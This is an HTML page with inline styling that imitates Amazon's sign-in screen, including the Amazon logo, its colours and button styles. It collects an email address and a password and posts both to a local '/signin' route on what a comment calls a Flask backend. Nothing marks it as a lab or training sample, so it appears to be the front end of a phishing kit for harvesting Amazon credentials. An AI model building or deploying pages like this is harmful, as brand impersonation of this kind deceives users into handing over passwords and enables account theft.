<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon Sign-In</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
    }

    .container {
      width: 350px;
      margin: 50px auto;
      border: 1px solid #ddd;
      padding: 20px;
      border-radius: 5px;
      background: #fff;
    }

    .logo {
      text-align: center;
      margin-bottom: 15px;
      margin-top: 15px;
    }

    .logo img {
      width: 100px;
    }

    h2 {
      font-size: 22px;
      font-weight: 400;
      margin-bottom: 15px;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #a6a6a6;
      border-radius: 3px;
      font-size: 14px;
    }

    .btn {
      background: #f0c14b;
      border: 1px solid #a88734;
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border-radius: 3px;
      cursor: pointer;
    }

    .btn:hover {
      background: #ddb347;
    }

    .help {
      margin-top: 15px;
      font-size: 12px;
    }

    .help a {
      color: #0066c0;
      text-decoration: none;
    }

    .help a:hover {
      text-decoration: underline;
    }

    .new-account {
      text-align: center;
      margin-top: 20px;
    }

    .new-account button {
      background: #e7e9ec;
      border: 1px solid #adb1b8;
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border-radius: 3px;
      cursor: pointer;
    }

    .new-account button:hover {
      background: #d7d9dc;
    }
  </style>
</head>
<body>
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
  </div>

  <div class="container">
    <h2>Sign-In</h2>
    <!-- Updated form for Flask backend -->
    <form action="/signin" method="POST">
      <label for="email">Email or mobile phone number</label>
      <input type="email" id="email" name="email" placeholder="Enter your email" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>

      <button type="submit" class="btn">Sign-In</button>
    </form>

    <div class="help">
      <a href="#">Forgot your password?</a><br>
      <a href="#">Need help?</a>
    </div>
  </div>

  <div class="new-account">
    <p>New to Amazon?</p>
    <button>Create your Amazon account</button>
  </div>
</body>
</html>
